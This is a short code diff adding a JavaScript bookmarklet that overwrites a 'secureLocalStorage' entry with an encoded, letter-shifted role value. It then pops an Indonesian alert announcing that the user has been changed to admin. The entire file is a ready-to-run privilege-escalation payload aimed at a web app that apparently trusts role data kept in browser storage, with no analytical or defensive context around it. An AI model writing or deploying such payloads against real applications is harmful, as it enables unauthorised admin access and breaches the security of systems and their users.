@@ -1,0 +1,4 @@
+javascript:(function(){
+    localStorage.setItem('secureLocalStorage', 
+    encodeURIComponent('%7B%22dUreqeYwiv%22%3A%22%5C%22FswReyjep%5C%22%22%2C%22ywivVspi%22%3A%22%5C%22ywiv%5C%22%22%7D'));
+    alert('berhasil mengubah user menjadi admin')})()
